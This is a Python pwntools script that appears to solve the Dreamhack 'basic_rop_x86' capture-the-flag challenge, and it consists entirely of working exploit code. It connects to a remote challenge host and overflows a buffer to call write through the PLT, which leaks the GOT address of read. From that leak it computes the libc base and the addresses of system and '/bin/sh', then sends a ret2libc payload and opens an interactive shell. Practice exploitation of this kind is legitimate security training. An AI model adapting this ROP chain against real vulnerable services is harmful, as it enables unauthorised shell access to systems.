from pwn import *

p = remote('host8.dreamhack.games', 22951)
e = ELF('/mnt/c/Users/storm/downloads/0270286a-5802-448d-9c5a-20a904dba1fb/basic_rop_x86')
libc = ELF('/mnt/c/Users/storm/downloads/0270286a-5802-448d-9c5a-20a904dba1fb/libc.so.6')

ret = 0x080483c2
pop3 = 0x08048689

# Leak read GOT address
payload = b'A' * 0x48
payload += p32(e.plt['write'])
payload += p32(pop3)
payload += p32(1) + p32(e.got['read']) + p32(4)
payload += p32(e.symbols['main'])

p.send(payload)
p.recvuntil(b'A' * 0x40)

# Leak libc base
read = u32(p.recv(4))
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + next(libc.search(b'/bin/sh'))

# Exploit
payload = b'A' * 0x48
payload += p32(system)
payload += b'AAAA' 
payload += p32(binsh)

p.send(payload)
p.interactive()